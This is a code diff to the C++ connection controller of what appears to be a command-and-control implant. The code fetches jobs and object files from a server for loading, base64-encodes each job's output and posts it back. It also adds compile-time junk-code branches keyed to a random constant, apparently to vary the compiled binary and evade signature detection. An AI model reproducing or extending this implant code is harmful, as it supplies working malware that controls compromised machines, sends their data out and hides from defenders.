@@ -11,6 +11,7 @@ using namespace std;
 #include "C2Config.h"
 #include "ServerResponse.h"
 #include "ObjectLoader.h"
+#include "OutputFormatter.h"
 
 class ConnectionController {
 private:
@@ -90,19 +91,39 @@ end:
         return bodyInit;
     }
 
-    char* prepareJobURL() {
-        int urlLen = this->JOB_ID.length() + strlen(URL_JOB);
+    // For safe multithreading, job Id must be given.
+    char* prepareJobURL(string jobId) {
+
+        int urlLen = jobId.length() + strlen(URL_JOB);
         char* urlJob = new char[urlLen];
-        snprintf(urlJob, urlLen, URL_JOB, this->JOB_ID.c_str());
+        snprintf(urlJob, urlLen, URL_JOB, jobId.c_str());
 
         return urlJob;
     }
 
-    char* prepareJobBody(int code) {
+    char* prepareJobBody(int code, int outputSize, char* outputData) {
+        
+        char* jobBody;
         string status = to_string(code);
+        int bodySize = status.length();
 
-        char* jobBody = new char[status.length() + strlen(BODY_JOB)];
-        snprintf(jobBody, status.length() + strlen(BODY_JOB), BODY_JOB, status.c_str());
+        if (outputSize > 0) {
+
+            // First encode data.
+            string encodedData = Crypto::base64_encode((unsigned char*)outputData, outputSize);
+        
+            // Create new buffer with the correct sizes.
+            bodySize += strlen(BODY_JOB_OUTPUT) + encodedData.length();
+            jobBody = new char[bodySize];
+
+            snprintf(jobBody, bodySize, BODY_JOB_OUTPUT, status.c_str(), encodedData.c_str());
+
+        } else {
+            bodySize += strlen(BODY_JOB);
+            jobBody = new char[bodySize];
+
+            snprintf(jobBody, bodySize, BODY_JOB, status.c_str());
+        }        
 
         return jobBody;
     }
@@ -163,16 +184,98 @@ public:
         else if (code == RESPONSE_KILL_JOB) {
             this->JOB_ID = json::getStr("jobId", responseBody);
         }
+        else {
+
+            // Garbage code
+            #if (RANDOMINT % 13) == 0
+		        printf("checkNewJob: G0\n");
+
+                int count = 0;
+                for (int x = 0; x < (RANDOMINT % 100); x++) {
+                    count += x;
+                }
+
+            #elif (RANDOMINT % 19) == 0
+                printf("checkNewJob: G1\n");
+
+                int v = 42;
+                if ((v >> 4) < 100) {
+                    v += 20 << 4;
+                } else if (v + (2 >> 3) == 214) {
+                    v -= 241;
+                }
+                else {
+                    v = v >> 12 - 14;
+                }
+
+            #elif (RANDOMINT % 22) == 0
+                printf("checkNewJob: G2\n");
+                for (int i = 0; i < 5; ++i) {
+                    int temp = i * (RANDOMINT % 5);
+                    if (temp % (RANDOMINT % 3 + 1) == 0) {
+                        temp += RANDOMINT % 10;
+                    } else {
+                        temp -= RANDOMINT % 5;
+                    }
+                }
+            #elif (RANDOMINT % 59) == 0 
+                printf("checkNewJob: G3\n");
+
+                int a = RANDOMINT % 100;
+                int b = RANDOMINT % 50;
+                int c, d;
+
+                int x = RANDOMINT % 2;
+                switch (x) {
+                    case 0:
+                        // No meaningful operations
+                    if (RANDOMINT % 2 == 0) {
+                            c = a + b + RANDOMINT % 20;
+                        } else {
+                            c = a * b;
+                        }
+                        break;
+                    case 1:
+                        x += RANDOMINT % 5;
+                        break;
+                    case 2:
+                        x *= RANDOMINT % 3;
+
+                        for (int i = 0; i < RANDOMINT % 5 + 1; ++i) {
+                            for (int j = 0; j < RANDOMINT % 4 + 1; ++j) {
+                                // No meaningful operations
+                                x += x;
+                            }
+                        }
+                        break;
+                    default:
+                        // No meaningful operations
+                        break;
+                }
+
+            #else
+                printf("checkNewJob: G4\n");
+                int x = RANDOMINT % 100;
+                for (int i = x; i > 0; i--) {
+                    x = x / 2;
+                }
+            #endif
+        }
 
         return code;
     }
 
     // Sends finish request to the server to let know we finished executing the job.
-    int finishJob(int code) {
+    int finishJob(string jobId, int code, int outputId) {
+
+        // Get the output if any.
+        int sizeOutput = 0;
+        char* outputData = OutputVariables::getOutputData(outputId, &sizeOutput);
 
         // Creat URL with job ID.
-        char* urlJob = prepareJobURL();
-        json::JSON responseBody = httpPOST(urlJob, prepareJobBody(code));
+        char* urlJob = prepareJobURL(jobId);
+
+        json::JSON responseBody = httpPOST(urlJob, prepareJobBody(code, sizeOutput, outputData));
         if (responseBody.size() <= 0) {
             return RESPONSE_ERROR;
         }
@@ -206,7 +309,7 @@ public:
         }
 
         // Load object data to object loader.
-        bool downloaded = downloadFile(prepareJobURL(), loader);
+        bool downloaded = downloadFile(prepareJobURL(this->JOB_ID), loader);
 
         pthread_mutex_unlock(&mutex);
         return downloaded;
